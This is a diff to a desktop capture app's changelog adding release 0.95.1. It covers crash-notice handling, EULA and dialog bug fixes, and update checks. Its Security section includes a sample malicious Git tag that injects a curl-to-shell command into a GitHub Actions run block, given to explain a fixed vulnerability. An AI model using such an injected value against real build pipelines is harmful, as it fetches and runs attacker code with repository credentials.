@@ -12,9 +12,80 @@ and this project aims to adhere to [Semantic Versioning](https://semver.org/spec
 
 ## [Unreleased]
 
-> The next rung toward **1.0.0** is **Phase 9** (accessibility / i18n / onboarding launch polish).
+> The next rung toward **1.0.0** is **Phase 9** (accessibility / i18n / onboarding launch polish),
+> tagged **0.96.0**. 1.0.0 then also gates on the 26 CAP-M must-haves, run as three themed batches
+> (0.97.0 / 0.98.0 / 0.99.0).
 
 _Nothing yet._
+
+## [0.95.1] — 2026-07-09 (Crash reporting, EULA persistence & dialog fixes)
+
+> Six bugs found while drilling the bug-report flow on real hardware — two of which would have shipped
+> in 1.0.0 — plus the crash-reporting and updater work those drills demanded. A crash now tells you it
+> happened and brings the studio back with the report already open.
+
+### Fixed
+- **A crash now tells you it happened, and brings the studio back.** A dying app cannot show its own
+  error window, so the panic hook spawns the same executable as a tiny Tauri-free helper
+  (`--crash-notice <pid>`), which shows a native "Freally Capture stopped unexpectedly" dialog, waits
+  for the crashed process to leave the process table, and relaunches. The reopened studio surfaces
+  the scrubbed report automatically. The wait is load-bearing: relaunching while the corpse still
+  holds the single-instance lock folds the new launch into the dying app and leaves no studio at all.
+- **Accepting the EULA no longer un-accepts itself.** `App.tsx` reads settings *and* the EULA status
+  at mount, so the settings snapshot predates acceptance; changing any setting in that same session
+  wrote the stale `acceptedEulaVersion: null` back over it and the gate returned on the next launch.
+  A profile saved before acceptance did the same. `SettingsStore::set()` now preserves the field and
+  `accept_eula()` is its only writer.
+- **Dialogs were trapped inside their dock.** `Panel`'s `backdrop-blur` makes it the containing block
+  for `position: fixed`, so `PickerShell`'s overlay centred itself inside the dock's box rather than
+  the window — 16 of 19 dialogs, including *Check for updates*, rendered partly off-screen with their
+  buttons unreachable. `PickerShell` now portals to `document.body`.
+- **Emailed crash reports silently opened nothing.** URL length was bounded by character count, but
+  percent-encoding inflates a 3-byte character ninefold — a real backtrace produced a ~7800-character
+  `mailto:`, past the ~2048 Windows ShellExecute limit, which opens a blank window and reports no
+  error. The bound is now on the **whole URL** (scheme, address, subject and body together), enforced
+  on encoded length, and truncation never splits an escape. Bounding only the body was not enough:
+  a subject is user text, and 80 CJK characters encode to 720 bytes, so a non-English report still
+  reached ~2285 characters.
+- **Two simultaneous panics showed two crash dialogs.** `panic = "abort"` does not stop the world
+  instantly, so two threads could each run the hook. The notice now spawns at most once per process.
+- **A crash-notice helper with no readable pid relaunched immediately**, straight into the
+  single-instance race it exists to avoid. It now waits a fixed interval instead.
+- **Dropdown menus stayed open when you clicked away.** The Sources rail's **+** menu and both
+  *Add filter* menus now close on an outside click or Escape. Escape closes the innermost thing only,
+  so a menu inside a dialog takes one press to dismiss and a second to close the dialog.
+
+### Added
+- **Compose in Gmail** alongside the existing mail-client button — plain https, no API key, nothing
+  auto-sent; a signed-out user meets Google's login screen and returns to the pre-filled draft.
+- **Crash reports carry the time they happened**, in the user's local clock with its UTC offset and in
+  UTC. The offset is weakly identifying and is documented as the one deliberate exception to the
+  report's "no personal identifiers" rule; the user reads the exact text before sending.
+- **The studio checks for updates once at launch** and surfaces the new version, its number, and this
+  file's release notes in a read-only field, with an explicit yes/no. A pending crash report always
+  wins the dialog slot; the update waits for the next launch. Offline or rate-limited checks stay
+  silent. `latest.json` now carries the version's `CHANGELOG.md` section as its `notes`.
+- Windows updates now run the NSIS wizard (`installMode: basicUi`) so the Finish page offers **Run
+  Freally Capture** and a desktop-shortcut checkbox, instead of restarting silently. The installer
+  also carries the app icon (`nsis.installerIcon`) rather than NSIS's stock one.
+
+### Removed
+- The **Testing** section of the bug-report dialog (*Simulate a crash report*, *Force a test crash*)
+  and its two IPC commands. A "crash the app" control has no business shipping in a live studio; the
+  loop is drilled with the `--test-crash` launch flag, which has no button and no command behind it.
+
+### Security
+- **Release workflow: shell injection via the tag name.** `${{ github.ref_name }}` was interpolated
+  straight into `run:` blocks, so GitHub spliced the tag into the shell *source* before bash parsed
+  it. Ref names forbid spaces but allow `"`, `;`, `$` and backticks, and `${IFS}` supplies the space —
+  a tag like `v1";curl${IFS}evil|sh;"` would execute. The tag now reaches the script through `env:`,
+  as data. Exploiting it required tag-push access, so this is defence in depth.
+- The release job's `actions/checkout` now sets `persist-credentials: false`. It holds
+  `contents: write` and only reads `CHANGELOG.md`; leaving the `GITHUB_TOKEN` in `.git/config` would
+  have handed any future injection a ready path to push.
+- `PRIVACY.md` now states plainly that the update check runs **once per launch** rather than only on
+  request, and that it sends nothing about the user — the previous wording said every network request
+  was "initiated by your action," which the new startup check made untrue.
 
 ## [0.95.0] — 2026-07-08 (Game capture, distribution & per-app audio — Phase 8)
 
